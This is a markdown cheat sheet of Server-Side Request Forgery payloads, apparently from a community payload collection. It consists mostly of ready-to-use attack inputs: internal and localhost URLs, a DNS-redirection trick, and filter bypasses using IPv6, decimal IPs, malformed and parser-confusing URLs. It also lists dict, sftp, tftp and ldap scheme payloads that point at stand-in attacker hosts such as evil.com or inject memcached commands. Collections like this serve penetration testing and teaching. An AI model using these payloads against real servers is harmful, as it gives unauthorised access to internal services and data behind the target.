# Server-Side Request Forgery
Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on behalf of him.

## Exploit

Basic SSRF v1
```
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
```

Basic SSRF v2
```
http://localhost:80
http://localhost:443
http://localhost:22
```

Advanced exploit using a redirection
```
1. Create a subdomain pointing to 192.168.0.1 with DNS A record  e.g:ssrf.example.com
2. Launch the SSRF: vulnerable.com/index.php?url=http://YOUR_SERVER_IP
vulnerable.com will fetch YOUR_SERVER_IP which will redirect to 192.168.0.1
```

Advanced exploit using type=url
```
Change "type=file" to "type=url"
Paste URL in text field and hit enter
Using this vulnerability users can upload images from any image URL = trigger an SSRF
```

## Bypassing
Bypass localhost with [::]
```
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:22/ SSH
http://[::]:3128/ Squid
```

Bypass localhost with a domain redirecting to locahost
```
http://n-pn.info
```

Bypass using a decimal ip location
```
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1
```

Bypass using malformed urls
```
localhost:+11211aaa
localhost:00011211aaaa
```

Bypass using rare address
```
http://0/
```

Bypass using tricks combination
```
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
urllib2 : 1.1.1.1
requests + browsers : 2.2.2.2
urllib : 3.3.3.3
```

## SSRF via URL Scheme
Dict://   
The DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:
```
dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
ssrf.php?url=dict://attacker:11111/
```

Sftp://
```
ssrf.php?url=sftp://evil.com:11111/
```

Tftp://
```
ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
```

Ldap://
```
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
```


## Thanks to
* [Hackerone - How To: Server-Side Request Forgery (SSRF)](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF)
* [Awesome URL abuse for SSRF by @orange_8361 #BHUSA](https://twitter.com/albinowax/status/890725759861403648)
* [How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE! Orange Tsai](http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)
* [SSRF Tips - xl7dev](http://blog.safebuff.com/2016/07/03/SSRF-Tips/)
* [SSRF in https://imgur.com/vidgif/url](https://hackerone.com/reports/115748)
